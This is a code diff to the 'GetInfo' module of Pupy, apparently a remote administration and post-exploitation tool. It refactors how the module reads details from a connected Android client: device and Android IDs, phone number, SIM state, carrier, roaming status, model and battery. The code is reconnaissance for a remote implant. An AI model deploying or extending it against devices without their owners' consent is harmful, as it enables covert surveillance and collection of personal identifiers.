@@ -9,7 +9,8 @@ __class_name__="GetInfo"
 class GetInfo(PupyModule):
     """ get some informations about one or multiple clients """
     dependencies = {
-        'windows': ["pupwinutils.security"],
+        'windows': ['pupwinutils.security'],
+        'android': ['pupydroid.utils']
     }
 
     @classmethod
@@ -62,45 +63,51 @@ class GetInfo(PupyModule):
                 infos.append((k, self.client.desc[k]))
 
         elif self.client.is_android():
-            self.client.load_package("pupydroid.utils")
-            wifiConnected = self.client.conn.modules["pupydroid.utils"].isWiFiConnected()
+            utils = self.client.remote('pupydroid.utils')
+
+            wifiConnected = utils.isWiFiConnected()
             if wifiConnected:
                 androidCtionType = {'info':"WiFi", 'fast':True}
             else:
-                androidCtionType = self.client.conn.modules["pupydroid.utils"].getMobileNetworkType()
+                androidCtionType = utils.getMobileNetworkType()
+
             infos.append(('ction_type', "{0} (fast:{1})".format(androidCtionType['info'], androidCtionType['fast'])))
-            androidID = self.client.conn.modules["pupydroid.utils"].getAndroidID()
+            androidID = utils.getAndroidID()
             infos.append(("android_id",androidID))
-            wifiEnabled = self.client.conn.modules["pupydroid.utils"].isWiFiEnabled()
+            wifiEnabled = utils.isWiFiEnabled()
             infos.append(("wifi_enabled",wifiConnected or wifiEnabled))
-            infoBuild = self.client.conn.modules["pupydroid.utils"].getInfoBuild()
+            infoBuild = utils.getInfoBuild()
             infos.append(("device_name",infoBuild['deviceName']))
             infos.append(("manufacturer",infoBuild['manufacturer']))
-            #infos.append(("model",infoBuild['model']))
-            #infos.append(("product",infoBuild['product']))
+            infos.append(("model",infoBuild['model']))
+            infos.append(("product",infoBuild['product']))
             infos.append(("bootloader_version",infoBuild['bootloaderVersion']))
             infos.append(("radio_version",infoBuild['radioVersion']))
             infos.append(("release",infoBuild['release']))
-            battery = self.client.conn.modules["pupydroid.utils"].getBatteryStats()
+            battery = utils.getBatteryStats()
             infos.append(("battery_%",battery['percentage']))
             infos.append(("is_charging",battery['isCharging']))
-            simState = self.client.conn.modules["pupydroid.utils"].getSimState()
+            simState = utils.getSimState()
             infos.append(("sim_state",simState))
-            deviceId = self.client.conn.modules["pupydroid.utils"].getDeviceId()
+            deviceId = utils.getDeviceId()
             infos.append(("device_id",deviceId))
             #Needs API level 23. When this API will be used, these 2 following line should be uncommented
-            #simInfo = self.client.conn.modules["pupydroid.utils"].getSimInfo()
-            #infos.append(("sim_count",simInfo))
+            try:
+                simInfo = utils.getSimInfo()
+                infos.append(("sim_count",simInfo))
+            except:
+                pass
+
             if ("absent" not in simState) and ("unknown" not in simState):
-                phoneNb = self.client.conn.modules["pupydroid.utils"].getPhoneNumber()
+                phoneNb = utils.getPhoneNumber()
                 infos.append(("phone_nb",phoneNb))
-                simCountryIso = self.client.conn.modules["pupydroid.utils"].getSimCountryIso()
+                simCountryIso = utils.getSimCountryIso()
                 infos.append(("sim_country",simCountryIso))
-                networkCountryIso = self.client.conn.modules["pupydroid.utils"].getNetworkCountryIso()
+                networkCountryIso = utils.getNetworkCountryIso()
                 infos.append(("network_country",networkCountryIso))
-                networkOperatorName = self.client.conn.modules["pupydroid.utils"].getNetworkOperatorName()
+                networkOperatorName = utils.getNetworkOperatorName()
                 infos.append(("network_operator",networkOperatorName))
-                isNetworkRoaming = self.client.conn.modules["pupydroid.utils"].isNetworkRoaming()
+                isNetworkRoaming = utils.isNetworkRoaming()
                 infos.append(("is_roaming",isNetworkRoaming))
             else:
                 #Print N/A when not applicable. These following lines can be removed from info if needed
